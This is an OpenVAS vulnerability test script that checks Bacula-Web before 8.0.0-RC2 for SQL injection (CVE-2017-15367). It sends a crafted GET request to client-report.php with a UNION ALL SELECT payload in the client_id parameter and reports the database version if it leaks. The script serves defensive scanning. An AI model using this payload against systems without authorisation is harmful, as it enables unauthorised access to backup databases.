##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_bacula_web_sql_inj_vuln.nasl 12120 2018-10-26 11:13:20Z mmartin $
#
# Bacula-Web < 8.0.0-RC2 SQL Injection Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2018 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:bacula-web:bacula-web";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140946");
  script_version("$Revision: 12120 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-26 13:13:20 +0200 (Fri, 26 Oct 2018) $");
  script_tag(name:"creation_date", value:"2018-04-04 13:05:03 +0700 (Wed, 04 Apr 2018)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2017-15367");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Bacula-Web < 8.0.0-RC2 SQL Injection Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_bacula_web_detect.nasl");
  script_mandatory_keys("bacula-web/installed");

  script_tag(name:"summary", value:"Bacula-web before 8.0.0-rc2 is affected by multiple SQL Injection
vulnerabilities that could allow an attacker to access the Bacula database and, depending on configuration,
escalate privileges on the server.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"affected", value:"Bacula-Web versions prior 8.0.0-rc2.");

  script_tag(name:"solution", value:"Update to version 8.0.0-rc2 or later.");

  script_xref(name:"URL", value:"http://bugs.bacula-web.org/view.php?id=211");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + '/client-report.php?period=7&client_id=21%20UNION%20ALL%20SELECT%20NULL,@@version%23';

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req);

version = eregmatch(pattern: '</dt> <dd>([^<]+)', string: res);
if (!isnull(version[1])) {
  report = 'It was possible to get the database version through an SQL injection.\n\nResult:\n' + version[1];
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
